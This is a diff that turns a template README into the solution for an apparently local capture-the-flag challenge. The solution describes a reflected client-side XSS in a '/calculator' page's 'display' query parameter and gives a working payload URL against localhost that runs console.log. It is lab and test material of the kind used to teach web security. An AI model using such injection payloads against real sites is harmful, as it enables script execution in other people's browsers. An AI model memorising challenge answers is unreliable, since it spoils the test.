@@ -1,10 +1,11 @@
-# How to Solve the Challenge?
+# Solution
 
-Provide reproducible steps to solve the challenge. This can include:
+## Injection
 
-- Runnable code (e.g., `PoC.py`)
-- A Bash script or a sequence of commented commands
-- Well-explained instructions
-- ...
+The `/calculator` page is vulnerable to a reflected client-side xss injection via the `dispaly` query parameter.
 
-Ensure that all dependencies required to build or run the solution are provided (e.g., `requirements.txt`) or thoroughly documented.
+## Working Payload
+
+```
+http://localhost:2025/calculator?display=console.log(%22I_FOUND_AN_XSS!!!%22)*1
+```
